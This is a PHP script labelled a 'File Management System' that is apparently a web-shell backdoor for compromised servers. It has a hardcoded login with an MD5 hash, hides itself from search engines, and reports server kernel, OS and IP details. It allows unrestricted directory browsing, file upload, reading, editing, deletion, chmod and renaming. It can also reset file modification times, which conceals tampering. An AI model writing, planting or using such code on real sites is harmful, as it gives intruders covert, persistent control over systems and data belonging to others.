<?php
session_start(); // Start the session to store messages

// Hardcoded credentials
$validUsername = 'bonjeng';
$validPasswordHash = 'd8ae95d68a715111d69902895cd874de'; // MD5 hash of the password

// Function to check the credentials
function checkCredentials($inputUsername, $inputPassword) {
    global $validUsername, $validPasswordHash;
    $inputPasswordHash = md5($inputPassword); // Hash the input password
    return $inputUsername === $validUsername && $inputPasswordHash === $validPasswordHash; // Return true if the credentials match
}

// Check if the user is logged in
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
        $usernameInput = $_POST['username'];
        $passwordInput = $_POST['password'];

        if (checkCredentials($usernameInput, $passwordInput)) {
            $_SESSION['logged_in'] = true; // Set session variable to indicate the user is logged in
        } else {
            $message = "Incorrect username or password.";
        }
    }
}

// If the user is not logged in, show the login form
if (!isset($_SESSION['logged_in'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="googlebot" content="noindex, nofollow" />
        <meta name="robots" content="noindex, nofollow" />
        <title>Login</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Quicksand', sans-serif;
            }
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                background: #000;
            }
            section {
                position: absolute;
                width: 100vw;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 2px;
                flex-wrap: wrap;
                overflow: hidden;
            }
            section::before {
                content: '';
                position: absolute;
                width: 100%;
                height: 100%;
                background: linear-gradient(#000, #0f0, #000);
                animation: animate 5s linear infinite;
            }
            @keyframes animate {
                0% {
                    transform: translateY(-100%);
                }
                100% {
                    transform: translateY(100%);
                }
            }
            section .signin {
                position: absolute;
                width: 400px;
                background: #222;  
                z-index: 1000;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 40px;
                border-radius: 4px;
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.9);
            }
            section .signin .content {
                position: relative;
                width: 100%;
                display: flex;
                justify-content: center;
                align-items: center;
                flex-direction: column;
                gap: 40px;
            }
            section .signin .content h2 {
                font-size: 2em;
                color: #0f0;
                text-transform: uppercase;
                text-align: center; /* Center the title */
            }
            section .signin .content .form {
                width: 100%;
                display: flex;
                flex-direction: column;
                gap: 25px;
            }
            section .signin .content .form .inputBox {
                position: relative;
                width: 100%;
            }
            section .signin .content .form .inputBox input {
                position: relative;
                width: 100%;
                background: #333;
                border: none;
                outline: none;
                padding: 25px 10px 7.5px;
                border-radius: 4px;
                color: #fff;
                font-weight: 500;
                font-size: 1em;
                box-sizing: border-box; /* Include padding and border in the element's total width */
            }
            section .signin .content .form .inputBox i {
                position: absolute;
                left: 0;
                padding: 15px 10px;
                font-style: normal;
                color: #aaa;
                transition: 0.5s;
                pointer-events: none;
            }
            section .signin .content .form .inputBox input:focus ~ i,
            section .signin .content .form .inputBox input:valid ~ i {
                transform: translateY(-7.5px);
                font-size: 0.8em;
                color: #fff;
            }
            section .signin .content .form .inputBox input[type="submit"] {
                padding: 10px;
                background: #0f0;
                color: #000;
                font-weight: 600;
                font-size: 1.35em;
                letter-spacing: 0.05em;
                cursor: pointer;
                width: 100%; /* Full width for the button */
                box-sizing: border-box; /* Include padding and border in the element's total width */
            }
            input[type="submit"]:active {
                opacity: 0.6;
            }
            @media (max-width: 900px) {
                section span {
                    width: calc(10vw - 2px);
                    height: calc(10vw - 2px);
                }
            }
            @media (max-width: 600px) {
                section span {
                    width: calc(20vw - 2px);
                    height: calc(20vw - 2px);
                }
            }
        </style>
    </head>
    <body>
        <section>
            <div class="signin">
                <div class="content">
                    <h2>Sign In</h2>
                    <form method="post" action="">
                        <div class="form">
                            <div class="inputBox">
                                <input type="text" name="username" required> <i>Username</i>
                            </div>
                            <div class="inputBox">
                                <input type="password" name="password" required> <i>Password</i>
                            </div>
                            <div class="inputBox">
                                <input type="submit" value="Login">
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </section>
    </body>
    </html>
    <?php
    exit(); // Stop further execution
}

// If the user is logged in, continue with the file management system
// Function to get system information
function getSystemInfo() {
    $kernel = php_uname('s') . ' ' . php_uname('r');
    $os = php_uname('v');
    return [
        'kernel' => $kernel,
        'os' => $os,
        'php_version' => phpversion(),
        'user_ip' => $_SERVER['REMOTE_ADDR'],
        'server_ip' => gethostbyname($_SERVER['SERVER_NAME']),
    ];
}

// Function to handle file uploads
function handleFileUpload($currentDir) {
    if (isset($_FILES['fileToUpload']) && $_FILES['fileToUpload']['error'] == UPLOAD_ERR_OK) {
        $tmpName = $_FILES['fileToUpload']['tmp_name'];
        $name = basename($_FILES['fileToUpload']['name']);
        $targetFile = $currentDir . '/' . $name;

        // Move the uploaded file
        if (move_uploaded_file($tmpName, $targetFile)) {
            return "File uploaded successfully: " . htmlspecialchars($name);
        } else {
            return "Failed to move uploaded file.";
        }
    }
    return "No file uploaded or there was an upload error.";
}

// Function to create a directory
function createDirectory($dirName) {
    if (!is_dir($dirName)) {
        if (mkdir($dirName, 0755, true)) {
            return "Directory created: " . htmlspecialchars($dirName);} else{
            return "Failed to create directory.";
        }
    }
    return "Directory already exists.";
}

// Function to read a file
function readFileContent($filePath) {
    if (file_exists($filePath)) {
        $content = file_get_contents($filePath);
        if ($content !== false) {
            return $content;
        } else {
            return "Failed to read file. Please check file permissions.";
        }
    }
    return "File does not exist: " . htmlspecialchars(basename($filePath));
}

// Function to list files in a directory, including hidden files
function listFiles($dir) {
    if (!is_dir($dir) || !is_readable($dir)) {
        return []; // Return an empty array if the directory does not exist or is not readable
    }

    $files = scandir($dir);
    $fileList = [];
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') { // Exclude current and parent directory
            $fileList[] = htmlspecialchars($file);
        }
    }
    return $fileList;
}

// Function to delete a file or directory recursively
function deleteFileOrDirectory($path) {
    if (is_dir($path)) {
        // Recursively delete all files and subdirectories
        $files = array_diff(scandir($path), ['.', '..']);
        foreach ($files as $file) {
            deleteFileOrDirectory("$path/$file");
        }
        return rmdir($path) ? "Directory deleted successfully." : "Failed to delete directory.";
    } else {
        return unlink($path) ? "File deleted successfully." : "Failed to delete file.";
    }
}

// Function to change file permissions
function changePermissions($filePath, $permissions) {
    if (chmod($filePath, $permissions)) {
        return "Permissions changed successfully to " . substr(sprintf('%o', $permissions), -4);
    } else {
        return "Failed to change permissions.";
    }
}

// Handle form submissions
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd(); // Get the current working directory from URL parameter
$message = ''; // Initialize message variable

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['upload'])) {
        $message = handleFileUpload($currentDir); // Handle file upload
    }

    if (isset($_POST['create_file'])) {
        $fileName = $_POST['file_name'] ?? '';
        $filePath = $currentDir . '/' . $fileName;
        if (file_put_contents($filePath, '') !== false) {
            $message = "New file created successfully: " . htmlspecialchars($fileName);
        } else {
            $message = "Error creating file.";
        }
    }

    if (isset($_POST['create_dir'])) {
        $dirName = $_POST['dir_name'] ?? '';
        $dirPath = $currentDir . '/' . $dirName;
        $message = createDirectory($dirPath); // Create a new directory
    }

    if (isset($_POST['delete'])) {
        $fileName = $_POST['file_name'] ?? '';
        $filePath = $currentDir . '/' . $fileName;
        $message = deleteFileOrDirectory($filePath); // Delete file or directory
    }

    if (isset($_POST['go_home'])) {
        // Redirect to home directory
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    }

    if (isset($_POST['change_permissions'])) {
        $fileName = $_POST['file_name'] ?? '';
        $filePath = $currentDir . '/' . $fileName;
        $newPermissions = intval($_POST['new_permissions'], 8); // Convert to octal
        $message = changePermissions($filePath, $newPermissions); // Change permissions
    }

    if (isset($_POST['change_modified'])) {
        $fileName = $_POST['file_name'] ?? '';
        $filePath = $currentDir . '/' . $fileName;
        $newModifiedTime = strtotime($_POST['new_modified_time']);
        if (touch($filePath, $newModifiedTime)) {
            $message = "Last modified time changed successfully for: " . htmlspecialchars($fileName);
        } else {
            $message = "Failed to change last modified time.";
        }
    }

    // Handle changing file name
    if (isset($_POST['change_name'])) {
        $oldFileName = $_POST['old_file_name'] ?? '';
        $newFileName = $_POST['new_file_name'] ?? '';
        $oldFilePath = $currentDir . '/' . $oldFileName;
        $newFilePath = $currentDir . '/' . $newFileName;

        if (rename($oldFilePath, $newFilePath)) {
            $message = "File renamed successfully: " . htmlspecialchars($newFileName);
        } else {
            $message = "Failed to rename file.";
        }
    }
}

// Update current directory if a folder is clicked
if (isset($_GET['dir'])) {
    $currentDir = $_GET['dir'];
}

$systemInfo = getSystemInfo();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="robots" content="noindex, nofollow" />
    <title>File Management System</title>
    <style>
        body {
           background-color: #070707; /* Gray background */
           color: #ffffff; /* Darker text color for better contrast */
           font-family: Arial, sans-serif;
           padding: 5px;
           margin: 0; /* Remove default margin */
       }
       
       .container {
           width: 100%;
           max-width: 1200px; /* Set a max width for larger screens */
           margin: auto;
           background: #000000;
           padding: 15px; /* Reduced padding */
           border-radius: 10px;
           box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
       }
       
       .highlight {
           color: #00ff0d;
       }
       
       .directory-link {
           color: #ff00dd; /* Green for directories */
           text-decoration: underline;
           cursor: pointer;
       }
       
       form {
           margin: 15px 0; /* Reduced margin */
           padding: 15px; /* Reduced padding */
           border: 1px solid #06ef11;
           border-radius: 10px;
           background-color: #f9f9f9;
           display: flex; /* Use flexbox for layout */
           flex-wrap: wrap; /* Allow wrapping */
           align-items: center; /* Center items vertically */
       }
       
       input[type="text"], 
       input[type="file"], 
       textarea {
           flex: 1; /* Allow inputs to grow and fill available space */
           min-width: 120px; /* Minimum width for inputs */
           padding: 5px; /* Reduced padding */
           margin: 5px; /* Margin for spacing */
           border: 1px solid #f5e100;
           border-radius: 5px;
           background-color: #fff;
           color: #ff00f7;
           font-size: 14px; /* Adjusted font size */
       }
       
       input[type="submit"] {
           padding: 5px 10px; /* Adjust padding for smaller buttons */
           border: none;
           border-radius: 6px;
           background-color: #007BFF;
           color: #fffbfb;
           cursor: pointer;
           margin: 5px; /* Margin for spacing */
           font-size: 12px; /* Adjusted font size for buttons */
       }
       
       input[type="submit"]:hover {
           background-color: #0011ff;
       }
       
       .file-list {
           width: 100%;
           margin-top: 20px; /* Space above the file list */
           padding: 5px;
           border: 3px solid #1d1d1d; /* Red border for visibility */
           border-radius: 10px;
           background: #0011ff;
       }
       
       table {
           width: 100%;
           border-collapse: collapse; /* Ensure borders are collapsed */
           margin-top: 20px; /* Space above the table */
       }
       
       th, td {
           padding: 5px; /* Increased padding for better spacing */
           text-align: center; /* Center text in cells */
           border-bottom: 2px solid #0bff03; /* Thinner border for better aesthetics */
           word-wrap: break-word; /* Allow long words to break */
           vertical-align: middle; /* Align text vertically in the middle */
       }
       
       th {
           background-color: #000; /* Black background for header */
           color: #fff;
           font-size: 15px; /* Adjusted font size for header */
       }
       
       td {
           background-color: #000000; /* Light background for table cells */
           font-size: 15px; /* Smaller font size for cells */
       }
       
       td form {
           display: inline; /* Keep forms inline for actions */
       }
       
       .action-buttons {
           flex-direction: column; /* Stack buttons vertically */
           align-items: center; /* Center buttons */
       }
       
       .action-buttons input {
           margin: 1px 5; /* Space between buttons */
           width: 75px; /* Set a fixed width for buttons */
           font-size: 10px; /* Font size for buttons */
       }
       
       @media (max-width: 768px) {
           th, td {
               font-size: 12px; /* Smaller font size on smaller screens */
               padding: 5px; /* Reduce padding */
           }
       }
       
       @media (max-width: 480px) {
           th, td {
               display: block; /* Stack cells on small screens */
               width: 100%; /* Full width for each cell */
               box-sizing: border-box; /* Include padding in width */
           }
           tr {
               display: flex;
               flex-direction: column; /* Stack rows vertically */
               margin-bottom: 10px; /* Space between rows */
           }
       }
       
       /* New CSS for the specified layout */
       .upload-container {
           display: flex;
           justify-content: space-between;
           margin-bottom: 1px;
       }
       
       .upload-container > div {
           flex: 1;
           margin-right: 1px;
       }
       
       .upload-container > div:last-child {
           margin-right: 0;
       }
       
       .bold-text {
           font-weight: bold;
           font-size: 14px; /* Standard size for displayed text */
       }
           </style>
</head>
<body>
    <div class="container">
        <h2>File Management System</h2>
        <b><big>
            <span class="highlight">Kernel : </span>
            <span><?php echo $systemInfo['kernel']; ?></span>
        </big></b><br>
        <b class="highlight">OS: </b>
        <span><?php echo $systemInfo['os']; ?></span><br>
        <b class="highlight">PHP Version: </b>
        <span><?php echo $systemInfo['php_version']; ?></span><br />
        <b class="highlight">Your IP Address: </b>
        <span><?php echo $systemInfo['user_ip']; ?></span><br>
        <b class="highlight">Server IP Address: </b>
        <span><?php echo $systemInfo['server_ip']; ?></span><br>

        <hr>
        <div>
            <strong>Current Directory:</strong> 
            <span>
                <a class="directory-link" href="?dir=<?php echo urlencode(dirname($currentDir)); ?>">
                    <?php echo htmlspecialchars($currentDir); ?>
                </a>
            </span>
            <span> | </span>
            <span>
                <form action="" method="post" style="display:inline;">
                    <button type="submit" name="go_home" class="home-button">Home</button>
                </form>
            </span>
        </div>

        <?php if (!empty($message)): ?>
            <div class="notification"><?php echo $message; ?></div>
        <?php endif; ?>
    </div>
    
    <div class="form-container">
        <!-- Form to upload a file -->
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" required>
            <input type="submit" name="upload" value="Upload File">
        </form>

        <!-- Form to create a new file -->
        <form action="" method="post">
            <input name="file_name" type="text" placeholder="New file name" required>
            <input name="create_file" type="submit" value="Create File">
        </form>

        <!-- Form to create a new directory -->
        <form action="" method="post">
            <input name="dir_name" type="text" placeholder="New directory name" required>
            <input name="create_dir" type="submit" value="Create Directory">
        </form>
    </div>

    <hr>

  <div class="file-list">
    <div class="highlight">Files and Directories:</div>
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Last Modified</th>
                <th>Date Modified</th>
                <th>Owner</th>
                <th>Group</th>
                <th>Permissions</th>
                <th>Chmod</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php
            // Display the list of directories first, then files
            $fileList = listFiles($currentDir);
            $directories = [];
            $files = [];

            foreach ($fileList as $file) {
                $filePath = $currentDir . '/' . $file;
                if (is_dir($filePath)) {
                    $directories[] = $file;
                } else {
                    $files[] = $file;
                }
            }

            // Display directories
            foreach ($directories as $dir) {
                $filePath = $currentDir . '/' . $dir;
                $lastModified = date("Y-m-d H:i:s", filemtime($filePath));
                $owner = posix_getpwuid(fileowner($filePath))['name'];
                $group = posix_getgrgid(filegroup($filePath))['name'];
                $permissions = substr(sprintf('%o', fileperms($filePath)), -4); // Get permissions in octal

                echo "<tr>";
                echo "<td><a class='directory-link' href='?dir=" . urlencode($filePath) . "'>" . htmlspecialchars($dir) . "</a></td>";
                echo "<td>$lastModified</td>";
                echo "<td>
                    <form action='' method='post' style='display:inline;'>
                        <input type='hidden' name='file_name' value='$dir'>
                        <input type='datetime-local' name='new_modified_time' required>
                        <input type='submit' name='change_modified' value='Change'>
                    </form>
                </td>";
                echo "<td>$owner</td>";
                echo "<td>$group</td>";
                echo "<td>$permissions</td>";
                echo "<td>
                    <form action='' method='post' style='display:inline;'>
                        <input type='hidden' name='file_name' value='$dir'>
                        <input type='text' name='new_permissions' placeholder='e.g. 0755' required>
                        <input type='submit' name='change_permissions' value='Chmod'>
                    </form>
                </td>";
                echo "<td class='action-buttons'>
                    <form action='' method='post' style='display:inline;'>
                        <input type='hidden' name='old_file_name' value='$dir'>
                        <input type='text' name='new_file_name' placeholder='New Name' required>
                        <input type='submit' name='change_name' value='Change Name'>
                    </form>
                    <form action='' method='post' style='display:inline;'>
                        <input type='hidden' name='file_name' value='$dir'>
                        <input type='submit' name='delete' value='Delete' onclick='return confirm(\"Are you sure you want to delete this directory?\");'>
                    </form>
                    <form action='' method='post' style='display:inline;'>
                        <input type='hidden' name='file_name' value='$dir'>
                        <input type='submit' name='view_file' value='View'>
                        <input type='submit' name='edit_file' value='Edit'>
                    </form>
                </td>";
                echo "</tr>";
            }

            // Display files
            foreach ($files as $file) {
                $filePath = $currentDir . '/' . $file;
                $lastModified = date("Y-m-d H:i:s", filemtime($filePath));
                $owner = posix_getpwuid(fileowner($filePath))['name'];
                $group = posix_getgrgid(filegroup($filePath))['name'];
                $permissions = substr(sprintf('%o', fileperms($filePath)), -4); // Get permissions in octal

                echo "<tr>";
                echo "<td>" . htmlspecialchars($file) . "</td>";
                echo "<td>$lastModified</td>";
                echo "<td>
                    <form action='' method='post' style='display:inline;'>
                        <input type='hidden' name='file_name' value='$file'>
                        <input type='datetime-local' name='new_modified_time' required>
                        <input type='submit' name='change_modified' value='Change'>
                    </form>
                </td>";
                echo "<td>$owner</td>";
                echo "<td>$group</td>";
                echo "<td>$permissions</td>";
                echo "<td>
                    <form action='' method='post' style='display:inline;'>
                        <input type='hidden' name='file_name' value='$file'>
                        <input type='text' name='new_permissions' placeholder='e.g. 0755' required>
                        <input type='submit' name='change_permissions' value='Chmod'>
                    </form>
                </td>";
                echo "<td class='action-buttons'>
                                       <form action='' method='post' style='display:inline;'>
                        <input type='hidden' name='old_file_name' value='$file'>
                        <input type='text' name='new_file_name' placeholder='New Name' required>
                        <input type='submit' name='change_name' value='Change Name'>
                    </form>
                    <form action='' method='post' style='display:inline;'><input type='hidden' name='file_name' value='$file'>
                        <input type='submit' name='delete' value='Delete' onclick='return confirm(\"Are you sure you want to delete this file?\");'>
                    </form>
                    <form action='' method='post' style='display:inline;'>
                        <input type='hidden' name='file_name' value='$file'>
                        <input type='submit' name='view_file' value='View'>
                        <input type='submit' name='edit_file' value='Edit'>
                    </form>
                </td>";
                echo "</tr>";
            }
            ?>
        </tbody>
    </table>
</div>

<?php
// If the user clicks "View", display the file content
if (isset($_POST['view_file'])) {
    $fileName = $_POST['file_name'] ?? '';
    $filePath = $currentDir . '/' . $fileName;
    $viewFileContent = readFileContent($filePath); // Read the content of the file to view
    echo "<div class='container'>";
    echo "<h3>Viewing File: " . htmlspecialchars($fileName) . "</h3>";
    echo "<pre class='file-content'>" . htmlspecialchars($viewFileContent) . "</pre>";
    echo "<form action='' method='post'>";
    echo "<input type='hidden' name='file_name' value='" . htmlspecialchars($fileName) . "'>";
    echo "<input type='submit' name='edit_file' value='Edit'>";
    echo "</form>";
    echo "</div>";
}

// If the user clicks "Edit", display the form for editing
if (isset($_POST['edit_file'])) {
    $fileName = $_POST['file_name'] ?? '';
    $filePath = $currentDir . '/' . $fileName;
    $fileContent = readFileContent($filePath); // Read the content of the file for editing
    echo "<div class='container'>";
    echo "<h3>Editing File: " . htmlspecialchars($fileName) . "</h3>";
    echo "<form action='' method='post'>";
    echo "<textarea name='file_content' rows='10' cols='80'>" . htmlspecialchars($fileContent) . "</textarea><br>";
    echo "<input type='hidden' name='file_name' value='" . htmlspecialchars($fileName) . "'>";
    echo "<input type='submit' name='save_file' value='Save Changes'>";
    echo "</form>";
    echo "</div>";
}

// Handle saving the edited file
if (isset($_POST['save_file'])) {
    $fileName = $_POST['file_name'] ?? '';
    $filePath = $currentDir . '/' . $fileName;
    $newContent = $_POST['file_content'] ?? '';
    if (file_put_contents($filePath, $newContent) !== false) {
        echo "<div class='notification'>File updated successfully: " . htmlspecialchars($fileName) . "</div>";
    } else {
        echo "<div class='notification'>Failed to update file.</div>";
    }
}
?>
</body>
</html>
